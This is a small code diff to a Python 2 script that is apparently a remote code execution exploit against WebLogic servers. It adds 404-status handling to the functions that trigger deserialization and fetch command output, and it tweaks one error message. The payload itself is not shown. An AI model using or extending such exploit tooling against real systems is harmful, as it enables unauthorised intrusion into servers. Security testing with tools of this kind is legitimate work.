@@ -54,6 +54,8 @@ def execute_cmd(target,output_file,command):
         r = requests.post(output_url,data=data,headers = headers,proxies=proxies,timeout=timeout)
         if r.status_code == requests.codes.ok:
             return (True,r.text.strip())
+        elif r.status_code == 404:
+            return (False,'404 no output')
         else:
             return (False,r.status_code)
     except requests.exceptions.ReadTimeout:
@@ -75,8 +77,10 @@ def weblogic_rce(target,cmd,output_file,shell_file):
         #500时说明已成功反序列化执行命令
         if r.status_code == 500:
             return execute_cmd(target,output_file,cmd)
+        elif r.status_code == 404:
+            return (False,'404 no vulnerability')
         else:
-            return (False,'{},something went wrong'.format(r.status_code))
+            return (False,'{} something went wrong'.format(r.status_code))
     except requests.exceptions.ReadTimeout:
         return (False,'timeout')
     except Exception,ex:
